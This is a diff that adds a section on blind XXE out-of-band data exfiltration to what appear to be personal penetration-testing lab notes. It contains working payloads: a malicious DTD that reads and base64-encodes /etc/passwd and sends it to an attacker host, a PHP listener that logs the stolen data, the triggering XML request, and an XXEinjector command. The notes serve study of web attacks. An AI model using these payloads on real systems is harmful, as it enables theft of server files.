@@ -511,5 +511,78 @@ We may find ourselves in a situation where the web app doesn't write any output,
 ```
 
 ## Blind Data Exfiltration
+### Summary
+Useful if the webapp doesn't write any of your inputs back to the screen.
+
+### Out-of-band Data Exfiltration
+We need to create 2 entities. One for the content of the file we are trying to read, and then one to send the contents of that file back to our attack host. We'll save these to our attack host and spin up an http server.
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+*Example xxe.dtd*
+
+With the above entities, our first entity reads and base64 encodes the content of `/etc/passwd` and stores it in the entity `file`. The second entity, when called, performs a web request with a content parameter that contains the value of file. We can then base64 decode the content parameter to get our results.
+
+If we want, we can generate a php script that will decode it for us. We can use the following code and save it as index.php:
+```php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+We start a php server in the same folder as our index.php
+```bash
+php -S 0.0.0.0:8000
+```
+
+We then craft our request, to reference our hosted dtd file. All we have to do is add the xml containing a reference to `oob` and our `remote` entity to pull our malicious dtd.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+*Example payload*
+
+Then we can go back to our php server and see that we did indeed get the file contents we were looking for, in this case `/etc/passwd`
+>Tip: Instead of using a parameter to hold our data, we could also edit our DTD to use `%file;` as a subdomain (`%file;.our.website.com`) and use tcpdump to intercept the traffic.
+
+### Automated OOB Exfiltration
+- We can use `XXE Injector` to exfiltrate data.
+
+- Installation
+```bash
+git clone https://github.com/enjoiz/XXEinjector.git
+```
+- Now we need to copy our request out of burp and save it as a file. We don't need to copy all of the XML, just the first line: `<?xml version="1.0" encoding="UTF-8"?>` and insert `XXEINJECT` right below it, so it should look like this:
+```http
+POST /blind/submitDetails.php HTTP/1.1
+Host: 10.129.201.94
+Content-Length: 169
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://10.129.201.94
+Referer: http://10.129.201.94/blind/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+```
+*Sample HTTP request*
+
+- Now we can run the tool
+```bash
+ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+```
+> Note: The data will probably not be printed to the console, however, we can view the results in the log file in the tools folder.
+
 # todo
 - [ ] Resume at Blind Data Exfiltration 
